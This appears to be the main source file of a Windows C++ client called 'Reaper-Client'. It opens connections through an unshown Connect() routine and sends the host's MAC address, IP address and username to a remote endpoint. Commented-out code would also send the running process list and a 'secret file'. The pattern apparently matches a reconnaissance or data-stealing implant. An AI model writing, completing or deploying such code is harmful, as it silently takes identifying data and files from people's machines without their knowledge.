// Reaper-Client.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#include "Comms.h"

int main()
{
	SOCKET s = Connect();
	SendMacAddress(s);
	closesocket(s);

	s = Connect();
	SendIPAddress(s);
	closesocket(s);

	s = Connect();
	SendUsername(s);
	closesocket(s);
	/*
	s = Connect();
	SendProcs(s);
	closesocket(s);
	*/
	/*
	s = Connect();
	SendSecretFile(s);
	closesocket(s);
	*/
	return 0;
}